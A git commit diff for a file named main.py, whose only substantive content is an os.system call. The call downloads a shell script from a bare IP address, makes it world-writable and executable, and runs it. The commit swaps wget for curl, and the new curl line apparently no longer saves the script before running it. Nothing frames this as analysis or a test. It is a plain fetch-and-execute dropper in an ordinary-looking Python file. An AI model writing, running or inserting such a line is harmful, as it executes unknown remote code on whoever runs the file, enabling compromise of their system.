6090000f7cd8d83df9aee41942599d0363ce5a1a
thisisrandomjohn <141927963+thisisrandomjohn@users.noreply.github.com>
2023-08-10 13:53:22 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,3 @@
 import os
 
-os.system("wget http://205.185.116.127/Gummybins.sh; chmod 777 Gummybins.sh; sh Gummybins.sh")
+os.system("curl 'http://205.185.116.127/Gummybins.sh'; chmod 777 Gummybins.sh; sh Gummybins.sh")
